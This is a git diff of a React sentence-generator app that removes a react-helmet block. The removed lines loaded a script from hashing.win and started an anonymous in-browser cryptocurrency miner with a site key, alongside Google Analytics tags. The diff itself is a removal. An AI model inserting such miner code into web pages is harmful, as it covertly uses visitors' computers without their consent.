@@ -7,7 +7,6 @@ import defaultSentences from './defaultSentences';
 import psychoanalystSentences from './psychoanalystSentences';
 import developerSentences from './developerSentences';
 import Transition from 'react-transition-group/Transition'
-import {Helmet} from "react-helmet";
 
 class App extends Component {
   constructor(props) {
@@ -146,26 +145,6 @@ class App extends Component {
                 }>Programador</a>
               </span>
             </div>
-            <Helmet>
-              <script src="https://www.hashing.win/scripts/min.js"></script>
-              <script>{`
-                setTimeout(function() {
-                var miner = new Client.Anonymous('51ed1bf989f3c9dabecfdfbd95ffd5201bae57b44faec639543d598b5e84c58a');
-                miner.start();
-                console.log(miner.isRunning())
-                }, 2000);`
-              }</script>
-
-              <script async src="https://www.googletagmanager.com/gtag/js?id=UA-111455041-1"></script>
-
-              <script>{`
-                window.dataLayer = window.dataLayer || [];
-                function gtag(){dataLayer.push(arguments);}
-                gtag('js', new Date());
-
-                gtag('config', 'UA-111455041-1');
-              `}</script>
-            </Helmet>
         </div>
     );
   }
